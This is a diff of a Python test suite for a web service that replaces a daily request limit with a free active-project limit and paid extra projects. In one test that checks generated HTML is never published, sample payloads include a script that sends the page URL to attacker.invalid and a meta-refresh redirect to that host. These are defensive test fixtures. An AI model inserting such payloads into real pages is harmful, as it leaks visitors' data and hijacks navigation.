@@ -125,7 +125,7 @@ class MiniFrankTest(unittest.TestCase):
     def make_client(
         self,
         *,
-        daily_limit=3,
+        free_project_limit=20,
         storage_cap_bytes=None,
         storage_min_free_bytes=0,
         max_job_records=None,
@@ -147,7 +147,7 @@ class MiniFrankTest(unittest.TestCase):
             hermes_request=self.hermes_request,
             hermes_chat_stream=self.hermes_chat_stream,
             rate_limit_key="test-rate-limit-key",
-            daily_limit=daily_limit,
+            free_project_limit=free_project_limit,
             hermes_data_root=self.hermes_data_root,
             storage_min_free_bytes=storage_min_free_bytes,
         )
@@ -477,13 +477,16 @@ class MiniFrankTest(unittest.TestCase):
         self.assertIn("/workspace/public", self.runs[0]["payload"]["input"])
         self.assertNotIn(str(self.project_root), json.dumps(self.runs[0]["payload"]))
 
-    def test_product_contract_is_free_only_with_no_email_priority_or_offer(self):
+    def test_product_contract_keeps_planning_open_and_offers_paid_additional_projects(self):
         config = self.client.get("/api/mini/config")
         self.assertEqual(config.status_code, 200)
-        config_text = json.dumps(config.get_json()).lower()
+        config_body = config.get_json()
+        config_text = json.dumps(config_body).lower()
         self.assertNotIn("email", config_text)
         self.assertNotIn("priority", config_text)
-        self.assertNotIn("offer", config_text)
+        self.assertTrue(config_body["conversation"]["planning_unmetered"])
+        self.assertEqual(config_body["projects"]["additional_projects"], "paid")
+        self.assertEqual(config_body["projects"]["free_active"], 20)
 
         created = self.create_job(email="ignored@example.com").get_json()
         public = created["job"]
@@ -597,7 +600,7 @@ class MiniFrankTest(unittest.TestCase):
         self.assertTrue((workspace / "result.json").is_file())
 
     def test_active_or_navigable_generated_html_is_never_published(self):
-        self.client = self.make_client(daily_limit=20)
+        self.client = self.make_client(free_project_limit=20)
         hostile_pages = {
             "script": "<script>location='https://attacker.invalid/?u='+location.href</script>",
             "meta": '<meta http-equiv="refresh" content="0;url=https://attacker.invalid/">',
@@ -1418,7 +1421,7 @@ class MiniFrankTest(unittest.TestCase):
         )
         self.assertEqual(len(stored), 1)
 
-    def test_global_rate_event_cap_stops_rotating_requester_growth(self):
+    def test_planning_intakes_do_not_consume_the_private_build_ledger(self):
         self.client = self.make_client(
             max_intake_records=10,
             max_rate_events=1,
@@ -1427,11 +1430,12 @@ class MiniFrankTest(unittest.TestCase):
         accepted = self.client.post(
             "/api/mini/intakes", json={}, headers={"X-Real-IP": "2001:db8::20"}
         )
-        event_limited = self.client.post(
+        second = self.client.post(
             "/api/mini/intakes", json={}, headers={"X-Real-IP": "2001:db8::21"}
         )
         self.assertEqual(accepted.status_code, 201)
-        self.assertEqual(event_limited.status_code, 507)
+        self.assertEqual(second.status_code, 201)
+        self.assertFalse((self.data_root / "mini" / "rate-events.json").exists())
 
     def test_global_storage_reservation_is_atomic_across_parallel_owners(self):
         payload = self.pdf_bytes(b"C" * 70_000)
@@ -1626,14 +1630,17 @@ class MiniFrankTest(unittest.TestCase):
         self.assertEqual(stored["run_id"], "run-1")
         self.assertEqual(len(self.runs), 1)
 
-    def test_json_errors_and_daily_free_limit_remain_publicly_safe(self):
+    def test_json_errors_and_active_project_limit_remain_publicly_safe(self):
         malformed = self.client.post("/api/mini/jobs", data="{", content_type="application/json")
         self.assertEqual(malformed.status_code, 400)
         self.assertTrue(malformed.is_json)
-        for index in range(3):
-            self.assertEqual(self.create_job(ip="203.0.113.99", outcome=f"Result {index}").status_code, 202)
+        self.client = self.make_client(free_project_limit=1)
+        self.assertEqual(self.create_job(ip="203.0.113.99").status_code, 202)
         limited = self.create_job(ip="203.0.113.99")
-        self.assertEqual(limited.status_code, 429)
+        self.assertEqual(limited.status_code, 402)
+        self.assertEqual(limited.get_json()["code"], "project_limit_reached")
+        self.assertEqual(limited.get_json()["additional_projects"], "paid")
+        self.assertIn("paid feature", limited.get_json()["error"])
         self.assertNotIn("traceback", json.dumps(limited.get_json()).lower())
 
     def test_rate_ledger_atomically_caps_parallel_events_and_expires_private_entries(self):
@@ -1658,10 +1665,10 @@ class MiniFrankTest(unittest.TestCase):
             "created_at": 1_000_000 + RATE_WINDOW_SECONDS + 1,
         }])
 
-    def test_deleted_intakes_still_count_toward_the_private_daily_ledger(self):
-        self.client = self.make_client(daily_limit=1)
+    def test_deleted_intakes_never_consume_the_project_entitlement(self):
+        self.client = self.make_client(free_project_limit=1)
         ip = "203.0.113.144"
-        for _ in range(6):
+        for _ in range(10):
             created = self.create_intake(ip=ip)
             deleted = self.client.delete(
                 f"/api/mini/intakes/{created['intake']['id']}",
@@ -1669,19 +1676,21 @@ class MiniFrankTest(unittest.TestCase):
             )
             self.assertEqual(deleted.status_code, 200)
 
-        limited = self.client.post("/api/mini/intakes", json={}, headers={"X-Real-IP": ip})
-        self.assertEqual(limited.status_code, 429)
-        ledger = json.loads((self.data_root / "mini" / "rate-events.json").read_text(encoding="utf-8"))
-        intake_events = [event for event in ledger if event["kind"] == "intake"]
-        self.assertEqual(len(intake_events), 6)
-        self.assertTrue(all(set(event) == {"requester_hash", "kind", "created_at"} for event in ledger))
+        replacement = self.create_intake(ip=ip)
+        reply = self.client.post(
+            f"/api/mini/intakes/{replacement['intake']['id']}/chat",
+            json={"text": "Help me plan the booking flow before I build anything."},
+            headers=self.claim_headers(replacement),
+        )
+        self.assertEqual(reply.status_code, 200)
+        reply.data
 
-    def test_guide_usage_cannot_be_reset_by_deleting_and_recreating_an_intake(self):
-        self.client = self.make_client(daily_limit=1)
+    def test_planning_chat_stays_available_past_the_old_turn_and_intake_limits(self):
+        self.client = self.make_client(free_project_limit=1)
         ip = "203.0.113.145"
         created = self.create_intake(ip=ip)
         headers = self.claim_headers(created)
-        for turn in range(8):
+        for turn in range(9):
             response = self.client.post(
                 f"/api/mini/intakes/{created['intake']['id']}/chat",
                 json={"text": f"Help me refine booking problem detail number {turn}."},
@@ -1689,25 +1698,68 @@ class MiniFrankTest(unittest.TestCase):
             )
             self.assertEqual(response.status_code, 200)
             response.data
-        self.assertEqual(
-            self.client.delete(f"/api/mini/intakes/{created['intake']['id']}", headers=headers).status_code,
-            200,
-        )
-
         replacement = self.create_intake(ip=ip)
-        limited = self.client.post(
+        continued = self.client.post(
             f"/api/mini/intakes/{replacement['intake']['id']}/chat",
-            json={"text": "Start the same guided conversation again."},
+            json={"text": "Help me spec a different idea without starting a build."},
             headers=self.claim_headers(replacement),
         )
-        self.assertEqual(limited.status_code, 429)
-        self.assertEqual(len(self.guide_turns), 8)
+        self.assertEqual(continued.status_code, 200)
+        continued.data
+        self.assertEqual(len(self.guide_turns), 10)
 
-    def test_build_usage_survives_job_record_cleanup(self):
-        self.client = self.make_client(daily_limit=1)
+    def test_submit_enforces_one_project_but_keeps_the_limited_intake_chat_open(self):
+        self.client = self.make_client(free_project_limit=1)
+        ip = "203.0.113.147"
+        first = self.create_intake(
+            ip=ip,
+            conversation=[{"role": "user", "text": "Plan a customer booking helper."}],
+        )
+        first_submit = self.client.post(
+            f"/api/mini/intakes/{first['intake']['id']}/submit",
+            json={},
+            headers=self.claim_headers(first),
+        )
+        self.assertEqual(first_submit.status_code, 202)
+
+        second = self.create_intake(ip=ip)
+        second_headers = self.claim_headers(second)
+        before_build = self.client.post(
+            f"/api/mini/intakes/{second['intake']['id']}/chat",
+            json={"text": "Help me plan an inventory dashboard before I build it."},
+            headers=second_headers,
+        )
+        self.assertEqual(before_build.status_code, 200)
+        before_build.data
+
+        limited = self.client.post(
+            f"/api/mini/intakes/{second['intake']['id']}/submit",
+            json={},
+            headers=second_headers,
+        )
+        self.assertEqual(limited.status_code, 402)
+        self.assertEqual(limited.get_json()["code"], "project_limit_reached")
+
+        after_limit = self.client.post(
+            f"/api/mini/intakes/{second['intake']['id']}/chat",
+            json={"text": "Keep refining it with low-stock alerts and weekly summaries."},
+            headers=second_headers,
+        )
+        self.assertEqual(after_limit.status_code, 200)
+        after_limit.data
+        reopened = self.client.get(
+            f"/api/mini/intakes/{second['intake']['id']}", headers=second_headers
+        ).get_json()["intake"]
+        self.assertEqual(reopened["status"], "draft")
+
+    def test_active_project_limit_is_applied_only_to_builds_and_released_after_expiry(self):
+        self.client = self.make_client(free_project_limit=1)
         ip = "203.0.113.146"
         first = self.create_job(ip=ip)
         self.assertEqual(first.status_code, 202)
+        limited = self.create_job(ip=ip)
+        self.assertEqual(limited.status_code, 402)
+        self.assertEqual(limited.get_json()["code"], "project_limit_reached")
         jobs_path = self.data_root / "mini" / "jobs.json"
         jobs = json.loads(jobs_path.read_text(encoding="utf-8"))
         jobs[first.get_json()["job"]["id"]]["expires_at"] = 1
@@ -1715,9 +1767,9 @@ class MiniFrankTest(unittest.TestCase):
         self.blueprint.mini_sweep_once()
         self.assertEqual(json.loads(jobs_path.read_text(encoding="utf-8")), {})
 
-        limited = self.create_job(ip=ip)
-        self.assertEqual(limited.status_code, 429)
-        self.assertEqual(len(self.runs), 1)
+        replacement = self.create_job(ip=ip)
+        self.assertEqual(replacement.status_code, 202)
+        self.assertEqual(len(self.runs), 2)
 
     def test_customer_get_reads_persisted_status_until_due_reconciler_runs(self):
         created = self.create_job().get_json()
